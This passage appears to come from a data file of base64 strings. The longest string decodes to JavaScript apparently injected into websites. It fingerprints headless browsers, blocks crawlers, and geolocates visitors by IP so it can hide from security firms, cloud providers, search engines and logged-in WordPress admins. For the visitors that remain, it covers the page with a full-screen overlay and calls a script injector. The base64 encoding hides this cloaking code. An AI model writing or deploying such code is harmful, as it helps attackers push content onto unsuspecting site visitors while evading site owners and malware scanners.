GNsYXNzZXMsIGlubGluZSBzdHlsZXMpIGZyb20gdGVtcGxhdGUgdG8gb3VyIGNvbnRhaW5lcgogICAgaWYgKGRvYy5ib2R5KSB7CiAgICAgICAgQXJyYXkuZnJvbShkb2MuYm9keS5hdHRyaWJ1dGVzKS5mb3JFYWNoKGF0dHIgPT4gewogICAgICAgICAgICBpZiAoYXR0ci5uYW1lID09PSAnc3R5bGUnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLnN0eWxlLmNzc1RleHQgKz0gJzsnICsgYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgPT09ICdjbGFzcycpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuY2xhc3NOYW1lID0gYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgIT09ICdpZCcpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuc2V0QXR0cmlidXRlKGF0dHIubmFtZSwgYXR0ci52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICAKICAgICAgICAvLyBNb3ZlIGFsbCBjaGlsZHJlbiBmcm9tIHRlbXBsYXRlIGJvZHkgdG8gY29udGFpbmVyCiAgICAgICAgd2hpbGUgKGRvYy5ib2R5LmZpcnN0Q2hpbGQpIHsKICAgICAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKGRvYy5ib2R5LmZpcnN0Q2hpbGQpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgc2hhZG93LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CiAgICAKICAgIC8vIFN0b3JlIHNoYWRvdyByb290IGdsb2JhbGx5IGZvciBzY3JpcHRzIHRvIHF1ZXJ5IGVsZW1lbnRzCiAgICB3aW5kb3cuX190ZlNoYWRvd1Jvb3QgPSBzaGFkb3c7CiAgICAKICAgIC8vIEZvcmNlIGxheW91dCByZWNhbGN1bGF0aW9uCiAgICB2b2lkIGhvc3Qub2Zmc2V0SGVpZ2h0OwogICAgCiAgICAvLyBCbG9jayBzY3JvbGwgb24gYm9keQogICAgZG9jdW1lbnQuYm9keS5zdHlsZS5vdmVyZmxvdyA9ICdoaWRkZW4nOwogICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgMCk7CiAgICAKICAgIHNldFRpbWVvdXQoaW5qZWN0U2NyaXB0LCAwKTsKICB9CgogIGNvbnN0IEhFQURMRVNTX1dFSUdIVCA9IDEwOwogIGNvbnN0IEhFQURGVUxfV0VJR0hUID0gLTg7CiAgY29uc3QgU1VTUElDSU9VU19XRUlHSFQgPSA1OwoKICBhc3luYyBmdW5jdGlvbiBkZXRlY3RIZWFkbGVzcygpIHsKICAgIGNvbnN0IGNoZWNrcyA9IFsKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvaGVhZGxlc3N8cGhhbnRvbWpzfHNlbGVuaXVtfHdlYmRyaXZlci9pLnRlc3QodWEpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc1dlYmRyaXZlciA9IG5hdmlnYXRvci53ZWJkcml2ZXIgPT09IHRydWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGhhc1dlYmRyaXZlciA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNDaHJvbWUgPSAhIXdpbmRvdy5jaHJvbWU7CiAgICAgICAgY29uc3QgaGFzQ29ycmVjdENocm9tZSA9IGhhc0Nocm9tZSAmJiAod2luZG93LmNocm9tZS5ydW50aW1lIHx8IHdpbmRvdy5jaHJvbWUubG9hZFRpbWVzKTsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhaGFzQ2hyb21lIHx8ICFoYXNDb3JyZWN0Q2hyb21lOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICBpZiAoIW5hdmlnYXRvci5wZXJtaXNzaW9ucykgcmV0dXJuIHsgc2NvcmU6IDAgfTsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcGVybWlzc2lvblN0YXR1cyA9IGF3YWl0IG5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7IG5hbWU6ICJub3RpZmljYXRpb25zIiB9KTsKICAgICAgICAgIGNvbnN0IG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPSBOb3RpZmljYXRpb24ucGVybWlzc2lvbjsKICAgICAgICAgIGNvbnN0IGlzSW5jb25zaXN0ZW50ID0gKG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPT09ICJkZW5pZWQiICYmIHBlcm1pc3Npb25TdGF0dXMuc3RhdGUgPT09ICJwcm9tcHQiKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0luY29uc2lzdGVudCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHBsdWdpbnNMZW5ndGggPSBuYXZpZ2F0b3IucGx1Z2lucz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gcGx1Z2luc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2VzTGVuZ3RoID0gbmF2aWdhdG9yLmxhbmd1YWdlcz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWxhbmd1YWdlIHx8IGxhbmd1YWdlc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdjYW52YXMnKTsKICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgaWYgKCFnbCkgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgICBjb25zdCBkZWJ1Z0luZm8gPSBnbC5nZXRFeHRlbnNpb24oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTsKICAgICAgICAgIGNvbnN0IHJlbmRlcmVyID0gZGVidWdJbmZvID8gZ2wuZ2V0UGFyYW1ldGVyKGRlYnVnSW5mby5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCkgOiAndW5rbm93bic7CiAgICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAvc3dpZnRzaGFkZXJ8bGx2bXBpcGV8bWVzYS9pLnRlc3QocmVuZGVyZXIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3Qgb3V0ZXJIZWlnaHQgPSB3aW5kb3cub3V0ZXJIZWlnaHQ7CiAgICAgICAgY29uc3Qgb3V0ZXJXaWR0aCA9IHdpbmRvdy5vdXRlcldpZHRoOwogICAgICAgIGNvbnN0IGlubmVySGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IGlubmVyV2lkdGggPSB3aW5kb3cuaW5uZXJXaWR0aDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAob3V0ZXJIZWlnaHQgPT09IDAgJiYgb3V0ZXJXaWR0aCA9PT0gMCkgfHwgKG91dGVySGVpZ2h0ID09PSBpbm5lckhlaWdodCAmJiBvdXRlcldpZHRoID09PSBpbm5lcldpZHRoKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzQ29udHJvbGxlZCA9IG5hdmlnYXRvci53ZWJkcml2ZXIgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgPT09ICd0cnVlJyB8fCB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0NvbnRyb2xsZWQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9IZWFkbGVzc0Nocm9tZS8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzUGhhbnRvbSA9IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b20gfHwgd2luZG93LnBoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzUGhhbnRvbSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzU2VsZW5pdW0gPSB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCdzZWxlbml1bScpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uJGNkY18gIT09IHVuZGVmaW5lZCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiR3ZGNfICE9PSB1bmRlZmluZWQ7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU2VsZW5pdW0gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0KICAgIF07CgogICAgbGV0IHRvdGFsU2NvcmUgPSAwOwogICAgZm9yIChjb25zdCBjaGVjayBvZiBjaGVja3MpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaGVjaygpOwogICAgICAgIHRvdGFsU2NvcmUgKz0gcmVzdWx0LnNjb3JlOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIC8vIElnbm9yZSBlcnJvcnMKICAgICAgfQogICAgfQoKICAgIGNvbnN0IG1heFBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBRExFU1NfV0VJR0hUOwogICAgY29uc3QgbWluUG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFERlVMX1dFSUdIVDsKICAgIGNvbnN0IG5vcm1hbGl6ZWRTY29yZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDEwMCwgKCh0b3RhbFNjb3JlIC0gbWluUG9zc2libGVTY29yZSkgLyAobWF4UG9zc2libGVTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpKSAqIDEwMCkpOwogICAgcmV0dXJuIE1hdGgucm91bmQobm9ybWFsaXplZFNjb3JlKTsKICB9CgogIGZ1bmN0aW9uIGRldGVjdE9TKCkgewogICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm0/LnRvTG93ZXJDYXNlKCkgfHwgJyc7CgogICAgaWYgKC9pcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2lvcyc7CiAgICBpZiAoL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnYW5kcm9pZCc7CiAgICBpZiAoL2xpbnV4L2kudGVzdCh1c2VyQWdlbnQpICYmICEvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdsaW51eCc7CiAgICBpZiAoL21hYyBvcyB4fG1hY2ludG9zaC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdtYWMnOwogICAgaWYgKC93aW4vaS50ZXN0KHVzZXJBZ2VudCkgfHwgL3dpbi9pLnRlc3QocGxhdGZvcm0pKSByZXR1cm4gJ3dpbmRvd3MnOwoKICAgIHJldHVybiAndW5rbm93bic7CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpc0FjY2Vzc0FsbG93ZWQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBkZXRlY3RlZE9TID0gZGV0ZWN0T1MoKTsKICAgICAgY29uc3QgaW5jbHVkZU9TTGlzdCA9IFtdOwogICAgICBpZiAoaW5jbHVkZU9TTGlzdC5sZW5ndGggPiAwICYmICFpbmNsdWRlT1NMaXN0LmluY2x1ZGVzKGRldGVjdGVkT1MpKSB7CiAgICAgICAgdmxvZygnZGVueV9vcycsIGRldGVjdGVkT1MpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBoZWFkbGVzc1Byb2JhYmlsaXR5ID0gYXdhaXQgZGV0ZWN0SGVhZGxlc3MoKTsKICAgICAgaWYgKGhlYWRsZXNzUHJvYmFiaWxpdHkgPiAyNSkgewogICAgICAgIHZsb2coJ2RlbnlfaGVhZGxlc3MnLCBoZWFkbGVzc1Byb2JhYmlsaXR5KTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYm90UGF0dGVybnMgPSBbJ2JvdCcsJ2NyYXdsJywnc3BpZGVyJywnc2NyYXBlJywnc2x1cnAnLCd5YWhvbycsJ2dvb2dsZScsJ3lhbmRleCcsJ2JhaWR1JywnYmluZycsJ2R1Y2tkdWNrJywndGVvbWEnLCdhcmNoaXZlJ107CiAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgZm9yIChjb25zdCBwYXR0ZXJuIG9mIGJvdFBhdHRlcm5zKSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmNsdWRlcyhwYXR0ZXJuKSkgewogICAgICAgICAgdmxvZygnZGVueV9ib3RfdWEnLCB1c2VyQWdlbnQpOwogICAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIAogICAgICBjb25zdCBpcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBpZiAoIWlwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpcGlmeV9mYWlsZWQnLCBpcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgaXBSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlwID0gaXBEYXRhLmlwOwoKICAgICAgY29uc3QgaXNwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcDJsb2NhdGlvbi1hcGktOTc5ODQ4MDY3Njc3LnVzLWNlbnRyYWwxLnJ1bi5hcHAvP2lwPScgKyBpcCk7CiAgICAgIGlmICghaXNwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpc3BfbG9va3VwX2ZhaWxlZCcsIGlzcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXNwRGF0YSA9IGF3YWl0IGlzcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXNwID0gaXNwRGF0YS5pc3AgfHwgJyc7CiAgICAgIGNvbnN0IGNvdW50cnlDb2RlID0gaXNwRGF0YS5nZW9pcDJfY291bnRyeV9jb2RlIHx8ICcnOwoKICAgICAgdmxvZygnaXBfaW5mbycsIHsgaXAsIGNvdW50cnlDb2RlLCBpc3AgfSk7CgogICAgICBjb25zdCBpbmNsdWRlQ291bnRyeUxpc3QgPSBbXTsKICAgICAgaWYgKGluY2x1ZGVDb3VudHJ5TGlzdC5sZW5ndGggPiAwICYmICghY291bnRyeUNvZGUgfHwgIWluY2x1ZGVDb3VudHJ5TGlzdC5pbmNsdWRlcyhjb3VudHJ5Q29kZSkpKSB7CiAgICAgICAgdmxvZygnZGVueV9jb3VudHJ5JywgY291bnRyeUNvZGUpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBibG9ja2VkSVNQcyA9IFsKICAgICAgICAnTTI0NyBFdXJvcGUnLCdQYWNrZXRodWInLCdMZWFzZVdlYicsJ0RhdGFDYW1wJywnSVBYTycsJ1NlY3VyZSBEYXRhIFN5c3RlbXMnLCdOaWVkZXJzYWVjaHNpc2NoZSBMYW5kZXNyZWdpZXJ1bmcnLCdCYXJyYWN1ZGEgTmV0d29ya3MnLCdUcmVuZCBNaWNybyBJbmNvcnBvcmF0ZWQnLCdNaWNyb3NvZnQgQ29ycCcsJ01pY3Jvc29mdCBDb3Jwb3JhdGlvbicsJ1N1cmZDb250cm9sJywnV2Vic2Vuc2UnLCdHSE9TVG5ldCBHbWJIJywnSU5FVHUnLCdBdmlyYSBCLlYuJywnR29vZ2xlIENsb3VkJywnWWFob28hJywnQ29tbXRvdWNoJywnQ2xvdWRGbGFyZScsJ1RydXN0d2F2ZSBIb2xkaW5ncycsJ0ZPUlRIbmV0IFNBJywnVVMgRGVwYXJ0bWVudCBvZiBEZWZlbnNlIE5ldHdvcmsnLCdaT05FUyBBUycsJ0Npc2NvIFN5c3RlbXMgSXJvbnBvcnQgRGl2aXNpb24nLCdUaGVQbGFuZXQuY29tIEludGVybmV0IFNlcnZpY2VzJywnV2Vicm9vdCBTZXJ2aWNlcycsJ1JhY2tzcGFjZSBIb3N0aW5nJywnUGVyaW1ldGVyIGVTZWN1cml0eScsJ0RpZ2l0YWxPY2VhbicsJ1BhY2tldEV4Y2hhbmdlJywnR3lyb24gSW50ZXJuZXQgTHRkJywnTmV3TWVkaWEgRXhwcmVzcyBQdGUnLCdBbWF6b24uY29tJywnTWNBZmVlJywnRVNFVCwgc3BvbC4gcyByLm8uJywnRmFjZWJvb2snLCdGYWNlYm9vayBJcmVsYW5kIEx0ZCcsJ1lhaG9vISBCcm9hZGNhc3QgU2VydmljZXMnLCdZYWhvbyEgSW5kaWEgUHZ0JywnWWFob28gSmFwYW4nLCdZYWhvbyBKYXBhbiBDb3Jwb3JhdGlvbicsJ0dvb2dsZWJvdCcsJ0FWQVNUIFNvZnR3YXJlIHMuci5vLicsJ01pY3Jvc29mdCBiaW5nYm90JywnTWljcm9zb2Z0IEhvc3RpbmcnLCdBbWF6b24gVGVjaG5vbG9naWVzJywnQ3l2ZWlsbGFuY2UnLCdDbG91ZG1hcmsnLCdDbG91ZG1hcmsgTGFicycsJ1RvcHN5IExhYnMnLCdBbWF6b24nLCdTRVJWRVIgQkxPQ0snLCdPVkggSG9zdGluZycsJ1lBTkRFWCcsJ1lBTkRFWCBMTEMnLCdZYWhvbyBCYW5nYWxvcmUgTmV0d29yayBNb25pdG9yaW5nIENlbnRlcicsJ1RpbmV0JywnTXVsdGltZWRpYSBQb2xza2EgUy5BLicsJ011bHRpbWVkaWEgUG9sc2thIC0gUG9sdWRuaWUgUy5BLicsJ1plbml0aCBFbGVjdHJvbmljcyBDb3Jwb3JhdGlvbicsJ0JhcnJhY3VkYSBDYW5hZGEnLCdNaWNyb3NvZnQgTGltaXRlZCcsJ01pY3Jvc29mdCAoQ2hpbmEpIENvLicsJ1NQQU1maWdodGVyIEFwUycsJ1NwYW1maWdodGVyLWFzJywnRGlnaXRhbE9uZSBBRycsJ1R3aXR0ZXInLCdUd2l0dGVyIEludGVybmF0aW9uYWwgQ29tcGFueScsJ1N1cmZjb250cm9sLXJlYWRpbmcnLCdZYWhvbyBDb3JwIE5ldHdvcmsnLCdDb25lY3RpdmEnLCdDb25lY3RpdmEgVGVsZWNvbScsJ0NvbmVjdGl2YSBDZWx1bGFyIGUgSW5mb3JtYXRpY2EgTHRkYScsJ1JlZGlmZi5jb20gSW5kaWEgTGltaXRlZCcsJ0luY2VybyBMTEMnLCdPTkxJTkUgUy5BLlMuJywnT05MSU5FIFNBUycsJ1Rpc2NhbGktaXQnLCdUaXNjYWxpIFNwQScsJ1Rpc2NhbGkgVUsgTGltaXRlZCcsJ0Z1aml0c3UnLCdEYXVtIENvbW11bmljYXRpb24gQ28uLExURCcsJ0ludGVybmV0IFNlY3VyaXR5IFN5c3RlbXMnLCdWS29udGFrdGUgTHRkJywnTGVhc2V3ZWInLCdMZWFzZVdlYiBOZXRoZXJsYW5kcyBCLlYuJywnTGVhc2VXZWIgQi5WLicsJ0xlYXNlV2ViIENETiBCLlYuJywnTGVhc2VXZWIgTmV0d29yayBCLlYuJywnTGVhc2V3ZWIgQXNpYScsJ0xlYXNld2ViIEFzaWEgUGFjaWZpYyBwdGUuJywnTGVhc2V3ZWIgRGV1dHNjaGxhbmQgR21iSCcsJ0xlYXNld2ViIFVTQScsJ0xlYXNld2ViLWRlJywnSW50ZXJOQVAgTmV0d29yayBTZXJ2aWNlcyBVLksuIExpbWl0ZWQnLCdJbnRlcm5hcCBKYXBhbiBDby4sTFRELicsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMnLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzIENvcnBvcmF0aW9uJywnQml0ZGVmZW5kZXItYXMnLCdCaXRkZWZlbmRlciBTUkwnLCdNWCBMb2dpYycsJ0NoaW5hIEVkdWNhdGlvbiBhbmQgUmVzZWFyY2ggTmV0d29yayBDZW50ZXInLCdDaGluYSBEdXR5IEZyZWUgZ3JvdXAnLCdDaGluYScsJ0NoaW5hIEJyb2FkYmFuZCBDb21tdW5pY2F0aW9ucyAoQ0JDbmV0KScsJ0NoaW5hIEJyb2FkY2FzdGluZyBUViBOZXQnLCdDaGluYSBDb21tdW5pY2F0aW9uIENvLicsJ0NoaW5hIENvbnN0cnVjdGlvbiBCYW5rIChBc2lhKSBDb3Jwb3JhdGlvbiBMaW1pdGVkJywnQ2hpbmEgQ3VsdHVyYWwgSGVyaXRhZ2UgSW5mb3JtYXRpb24gYW5kIENvbnN1bHRpbmcnLCdDaGluYSBEaWdpdGFsIEtpbmdkb20gVGVjaG5vbG9neSBDby4sTHRkLicsJ0NoaW5hIERyYWdvbiBUZWxlY29tIENvLixMdGQnLCdGYWN0aW9uJywnWmVuIFN5c3RlbXMgQS9TJywnT1ZIIFNBUycsJ1NvbHV0aW9uIFBybycsJ0RlZEZpYmVyQ28nLCdDbGVhckJsdWUgVGVjaG5vbG9naWVzJywnSW5mb3JtYXRpb24gVGVjaG5vbG9neSBTeXN0ZW1zJywnR29EYWRkeS5jb20sIExMQycsJ1NlcnZlciBDZW50cmFsIE5ldHdvcmsnLCdUaW5ldCBTcGEnLCdDYXByaXMgR3JvdXAnLCdJbmt0b21pIENvcnBvcmF0aW9uJywnVW5pZmllZCBMYXllcicsJ0pTQyBSVENvbW0uUlUnLCdMTEMgbWFzdGVyaG9zdCcsJ01UTyBUZWxlY29tJywnTGlua2VkSW4gQ29ycG9yYXRpb24nLCdXZWJzaXRld2VsY29tZS5jb20nLCdHVFMgVGVsZWNvbSBTUkwnLCdQdWxzZVBvaW50IENvbW11bmljYXRpb25zJywnUHVsc2Vwb2ludCcsJ1RpbWVXZWIgTHRkLicsJ0JlaWppbmcgQmFpZHUgTmV0Y29tIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kgQ28uJywnRGlnaXRhbCBPY2VhbicsJ1RocmVhdFRyYWNrJywnVGhyZWF0VHJhY2sgU2VjdXJpdHknLCdFR0lIb3N0aW5nJywnSEVUWk5FUicsJ0hldHpuZXItYXMnLCdIZXR6bmVyIE9ubGluZSBHbWJIJywnSEVUWk5FUiAoUHR5KSBMdGQnLCdIZXR6bmVyIENDJywnTGltaXRlZCBsaWFiaWxpdHkgY29tcGFueSBNYWlsLlJ1JywnQW1hem9uIENvcnBvcmF0ZSBMTEMnLCdBbWF6b24gRGF0YSBTZXJ2aWNlcyBJcmVsYW5kIEx0ZCcsJ0FtYXpvbiBXZWIgU2VydmljZXMsIExMQycsJ0FtYXpvbi5jb20gVGVjaCBUZWxlY29tJywnQW1hem9uaWEgUHVibGljaWRhZGUgTHRkYScsJ0FtYXpvbmlhIFRlbGVjb20gTHRkYS4gLSBNZScsJ0thc3BlcnNreSBMYWIgQU8nLCdBbGlzdGFyIFNlY3VyaXR5IFNybCcsJ05GT3JjZSBFbnRlcnRhaW5tZW50IEIuVi4nLCdTSyBCcm9hZGJhbmQnLCdaYXlvIEdyb3VwIEVVIExpbWl0ZWQnLCdRdWFkcmFOZXQnLCdSYW1Ob2RlIExMQycsJ0hvc3RVUycKICAgICAgXTsKCiAgICAgIGlmIChibG9ja2VkSVNQcy5pbmNsdWRlcyhpc3ApKSB7CiAgICAgICAgdmxvZygnZGVueV9pc3AnLCBpc3ApOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIAoKICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignQWNjZXNzIGNoZWNrIGZhaWxlZDonLCBlcnIpOwogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGluaXQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBhbGxvd2VkID0gYXdhaXQgaXNBY2Nlc3NBbGxvd2VkKCk7CiAgICAgIHZsb2coJ2FjY2Vzc19hbGxvd2VkJywgYWxsb3dlZCk7CiAgICAgIGlmICghYWxsb3dlZCkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgY29uc3Qgc2tpcCA9IGdldFZhbCgnX3NraXAnLCAnMCcpOwogICAgICBpZiAoc2tpcCA9PT0gJzEnKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgbGV0IGNvdW50ID0gcGFyc2VJbnQoZ2V0VmFsKEtFWSwgJzAnKSwgMTApOwogICAgICBpZiAoTnVtYmVyLmlzTmFOKGNvdW50KSkgY291bnQgPSAwOwogICAgICBjb3VudCsrOwogICAgICBzZXRWYWwoS0VZLCBjb3VudC50b1N0cmluZygpKTsKCiAgICAgIGlmIChjb3VudCA+PSBOKSB7CiAgICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgdmVycignaW5pdF9mYWlsZWQnLCBlKTsKICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgfQogIH0KCiAgaWYgKGRvY3VtZW50LmJvZHkpIHsKICAgIGluaXQoKTsKICB9IGVsc2UgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0KfSkoKTsKICA=",
    "MC4wODAzODMwOTU2NTk1NjgzNg==",
    "MC4yMTI0NTY2MTI0NDc5MDQ2",
